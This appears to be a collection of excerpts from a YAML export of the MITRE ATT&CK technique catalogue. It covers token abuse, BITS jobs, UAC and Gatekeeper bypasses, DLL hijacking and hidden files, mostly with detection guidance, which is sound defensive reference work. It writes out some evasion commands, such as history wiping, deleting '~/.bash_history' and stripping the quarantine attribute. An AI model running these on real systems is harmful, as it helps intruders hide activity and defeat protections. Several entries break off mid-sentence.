        calls the Windows token APIs directly, analysts can detect token manipulation
        only through careful analysis of user network activity, examination of running
        processes, and correlation with other endpoint and network behavior. \n\nThere
        are many Windows API calls a payload can take advantage of to manipulate access
        tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation:
        Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation:

        Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

        For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

        Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.

        Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)

        Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

        BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)

        BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). (Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>). (Citation: Microsoft BITS)

        Monitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)  (Citation: Microsoft BITS)Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. (Citation: CTU BITS Malware June 2016)

        Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).

This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.

        Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)

      description: |-
        Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.

        Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)

        Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass)

        There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038), which indicate attempts to gain access to higher privileged processes.

        Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

        * The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key. (Citation: enigma0x3 Fileless UAC Bypass)
        * The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys. (Citation: enigma0x3 sdclt app paths) (Citation: enigma0x3 sdclt bypass)

        Analysts should monitor these Registry settings for unauthorized changes.

        The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

        Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.

        CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.

        Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.

        Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)

        * To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.
        * To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).

      description: macOS and Linux both keep track of the commands users type in their
        terminal so that users can easily remember what they've done. These logs can
        be accessed in a few different ways. While logged in, this command history
        is tracked in a file pointed to by the environment variable <code>HISTFILE</code>.
        When a user logs off a system, this information is flushed to a file in the
        user's home directory called <code>~/.bash_history</code>. The benefit of
        this is that it allows users to go back to commands they've used before in
        different sessions. Since everything typed on the command-line is saved, passwords
        passed in on the command line are also saved. Adversaries can abuse this by
        searching these files for cleartext passwords. Additionally, adversaries can
        use a variety of methods to prevent their own commands from appear in these
        logs such as <code>unset HISTFILE</code>, <code>export HISTFILESIZE=0</code>,
        <code>history -c</code>, <code>rm ~/.bash_history</code>.

The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)

        Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)

        Code signing certificates may be used to bypass security policies that require signed code to execute on a system.

        Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)

        Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)

        Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) (Citation: SanDisk SMART) (Citation: SmartMontools) disk monitoring may reveal malicious manipulations of components. Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.

        Disk check and forensic utilities (Citation: ITWorld Hard Disk Health Dec 2014) may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. Also consider comparing components, including hashes of component firmware and behavior, against known good images.

        (Citation: Microsoft Component Object Model) Adversaries can use this system
        to insert malicious code that can be executed in place of legitimate software
        through hijacking the COM references and relationships as a means for persistence.
        Hijacking a COM object requires a change in the Windows Registry to replace
        a reference to a legitimate system component which may cause that component
        to not work when executed. When that system component is executed through
        normal system operation the adversary''s code will be executed instead. (Citation:
        GDATA COM Hijacking) An adversary is likely to hijack objects that are used
        frequently enough to maintain a consistent level of persistence, but are unlikely
        to break noticeable functionality within the system as to avoid system instability
        that could lead to detection.'

        Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.

        External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the internet and then the proxy would forward communications to the C2 server.

        Internal connection proxies can be used to consolidate internal connections from compromised systems. Adversaries may use a compromised internal system as a proxy in order to conceal the true destination of C2 traffic. The proxy can redirect traffic from compromised systems inside the network to an external C2 server making discovery of malicious traffic difficult. Additionally, the network can be used to relay information from one system to another in order to avoid broadcasting traffic to all systems.

      description: |-
        Windows Control Panel items are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file. (Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)

        For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. (Citation: Microsoft Implementing CPL)

        Adversaries can use Control Panel items as execution payloads to execute arbitrary commands. Malicious Control Panel items can be delivered via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension whitelisting.

        Monitor and analyze activity related to items associated with CPL files, such as the Windows Control Panel process binary (control.exe) and the Control_RunDLL and ControlRunDLLAsUser API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl</code>) before [Rundll32](https://attack.mitre.org/techniques/T1085) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl</code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https://attack.mitre.org/techniques/T1085) command, which may bypass detections and/or execution filters for control.exe. (Citation: TrendMicro CPL Malware Jan 2014)

        Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:

        * Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code> and <code>HKEY_CLASSES_ROOT\CLSID\{GUID}</code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)
        * CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>Cpls</code> and <code>Extended Properties</code> Registry keys of <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Control Panel</code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec("c:\windows\system32\control.exe {Canonical_Name}", SW_NORMAL);</code>) or from a command line (<code>control.exe /name {Canonical_Name}</code>). (Citation: Microsoft Implementing CPL)
        * Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers</code> where {name} is the predefined name of the system item. (Citation: Microsoft Implementing CPL)

        Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.

        DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). (Citation: DCShadow Blog) (Citation: BlueHat DCShadow Jan 2018) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

        Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

        This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1178) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.

        Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with “GC/”) by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging. (Citation: ADDSecurity DCShadow Feb 2018) A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.

      description: "Windows systems use a common method to look for required DLLs
        to load into a program. (Citation: Microsoft DLL Search) Adversaries may take
        advantage of the Windows DLL search order and programs that ambiguously specify
        DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform
        DLL preloading, also called binary planting attacks, (Citation: OWASP Binary
        Planting) by placing a malicious DLL with the same name as an ambiguously
        specified DLL in a location that Windows searches before the legitimate DLL.
        Often this location is the current working directory of the program. Remote
        DLL preloading attacks occur when a program sets its current directory to
        a remote location such as a Web share before loading a DLL. (Citation: Microsoft
        2269637) Adversaries may use this behavior to cause the program to load a
        malicious DLL. \n\nAdversaries may also directly modify the way a program
        loads DLLs by replacing an existing DLL or modifying a .manifest or .local
        redirection file, directory, or junction to cause the program to load a different
        DLL to maintain persistence or privilege escalation. (Citation: Microsoft
        DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search
        Order)\n\nIf a search order-vulnerable program is configured to run at a higher
        privilege level, then the adversary-controlled DLL that is loaded will also
        be executed at the higher level. In this case, the technique could be used
        for privilege escalation from user to administrator or SYSTEM or from administrator
        to SYSTEM, depending on the program.\n\nPrograms that fall victim to path
        hijacking may appear to behave normally because malicious DLLs may be configured
        to also load the legitimate DLLs they were meant to replace."

        Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), [PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on the system.

        One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file. (Citation: Malwarebytes Targeted Attack against Saudi Arabia)

        Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)

        Payloads may be compressed, archived, or encrypted in order to avoid detection.  These payloads may be used with [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

        Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).

        Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.

      name: Execution Guardrails
      description: "Execution guardrails constrain execution or actions based on adversary
        supplied environment specific conditions that are expected to be present on
        the target. \n\nGuardrails ensure that a payload only executes against an
        intended target and reduces collateral damage from an adversary’s campaign.(Citation:
        FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target
        system or environment to use as guardrails may include specific network share
        names, attached physical devices, files, joined Active Directory (AD) domains,
        and local/external IP addresses.\n\nEnvironmental keying is one type of guardrail
        that includes cryptographic techniques for deriving encryption/decryption
        keys from specific types of values in a given computing environment.(Citation:
        EK Clueless Agents) Values can be derived from target-specific elements and
        used to generate a decryption key for an encrypted payload. Target-specific
        values can be derived from specific network shares, physical devices, software/software
        versions, files, joined AD domains, system time, and local/external IP addresses.(Citation:
        Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation:
        EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation:
        Ebowla: Genetic Malware) By generating the decryption keys from target-specific
        environmental values, environmental keying can make sandbox detection, anti-virus
        detection, crowdsourcing of information, and reverse engineering difficult.(Citation:
        Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties
        can slow down the incident response process and help adversaries hide their
        tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files
        or Information](https://attack.mitre.org/techniques/T1027), adversaries may
        use guardrails and environmental keying to help protect their TTPs and evade
        detection. For example, environmental keying may be used to deliver an encrypted
        payload to the target that will use target-specific values to decrypt the
        payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation:
        EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation:
        Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing
        target-specific values to decrypt the payload the adversary can avoid packaging
        the decryption key with the payload or sending it over a potentially monitored
        network connection. Depending on the technique for gathering target-specific
        values, reverse engineering of the encrypted payload can be exceptionally
        difficult.(Citation: Kaspersky Gauss Whitepaper) In general, guardrails can
        be used to prevent exposure of capabilities in environments that are not intended
        to be compromised or operated within. This use of guardrails is distinct from
        typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
        where a decision can be made not to further engage because the value conditions
        specified by the adversary are meant to be target specific and not such that
        they could occur in any environment."

        Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.

        Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1063).

      name: Extra Window Memory Injection
      description: |-
        Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)

        Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.

        Execution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.

        Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.

        There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools.

      x_mitre_detection: It may be uncommon for events related to benign command-line
        functions such as DEL or third-party utilities or tools to be found in an
        environment, depending on the user base and how systems are typically used.
        Monitoring for command-line deletion functions to correlate with binaries
        or other files that an adversary may drop and remove may lead to detection
        of malicious activity. Another good practice is monitoring for known deletion
        and secure deletion tools that are not already on systems within an enterprise
        network that an adversary could introduce. Some monitoring tools may collect
        command-line arguments, but may not capture DEL commands since DEL is a native
        function within cmd.exe.

      description: |-
        File and directory permissions are commonly managed by discretionary access control lists (DACLs) specified by the file or directory owner. File and directory DACL implementations may vary by platform, but generally explicitly designate which users/groups can perform which actions (ex: read, write, execute, etc.). (Citation: Microsoft DACL May 2018) (Citation: Microsoft File Rights May 2018) (Citation: Unix File Permissions)

        Adversaries may modify file or directory permissions/attributes to evade intended DACLs. (Citation: Hybrid Analysis Icacls1 June 2018) (Citation: Hybrid Analysis Icacls2 May 2018) Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions such as Administrator/root depending on the file or directory's existing permissions to enable malicious activity such as modifying, replacing, or deleting specific files/directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1015), [Logon Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files.

        Monitor and investigate attempts to modify DACLs and file/directory ownership, such as use of icacls (Citation: Microsoft icacls OCT 2017), takeown (Citation: Microsoft takeown OCT 2017), attrib (Citation: Microsoft attrib OCT 2017), and [PowerShell](https://attack.mitre.org/techniques/T1086) Set-Acl (Citation: Microsoft SetAcl) in Windows and chmod (Citation: Linux chmod)/chown (Citation: Linux chown) in macOS/Linux. Many of these are built-in system utilities and may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.

        Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. Windows Security Log events (Event ID 4670) are used when DACLs are modified. (Citation: EventTracker File Permissions Feb 2014)

      description: "In macOS and OS X, when applications or programs are downloaded
        from the internet, there is a special attribute set on the file called <code>com.apple.quarantine</code>.
        This attribute is read by Apple's Gatekeeper defense program at execution
        time and provides a prompt to the user to allow or deny execution. \n\nApps
        loaded onto the system from USB flash drive, optical disk, external hard drive,
        or even from a drive shared over the local network won’t set this flag. Additionally,
        other utilities or events like drive-by downloads don’t necessarily set it
        either. This completely bypasses the built-in Gatekeeper check. (Citation:
        Methods of Mac Malware Persistence) The presence of the quarantine flag can
        be checked by the xattr command <code>xattr /path/to/MyApp.app</code> for
        <code>com.apple.quarantine</code>. Similarly, given sudo access or elevated
        permission, this attribute can be removed with xattr as well, <code>sudo xattr
        -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing
        quarantine attribute) (Citation: OceanLotus for OS X)\n \nIn typical operation,
        a file will be downloaded from the internet and given a quarantine flag before
        being saved to disk. When the user tries to open the file or application,
        macOS’s gatekeeper will step in and check for the presence of this flag. If
        it exists, then macOS will then prompt the user to confirmation that they
        want to run the program and will even provide the URL where the application
        came from. However, this is all based on the file being downloaded from a
        quarantine-savvy application. (Citation: Bypassing Gatekeeper)"

        the intended discretionary access controls for a domain, usually with the
        intention of escalating privileges on the domain. \n\nGroup policy allows
        for centralized management of user and computer settings in Active Directory
        (AD). GPOs are containers for group policy settings made up of files stored
        within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation:
        TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike
        other objects in AD, GPOs have access controls associated with them. By default
        all user accounts in the domain have permission to read GPOs. It is possible
        to delegate GPO access control permissions, e.g. write access, to specific
        users or groups in the domain.\n\nMalicious GPO modifications can be used

        that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs) Publicly

        an adversary might modify specific user rights like SeEnableDelegationPrivilege,
        set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>,
        to achieve a subtle AD backdoor with complete control of the domain because

      name: Hidden Files and Directories
      description: |-
        To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

        Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.

        ### Windows

        Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.

        ### Linux/Mac

        Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.

        ### Mac

        Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).
        Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

      description: |
        Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.

        ### Windows
        There are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)

        ### Mac
        The configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware)

      name: Image File Execution Options Injection
      description: |-
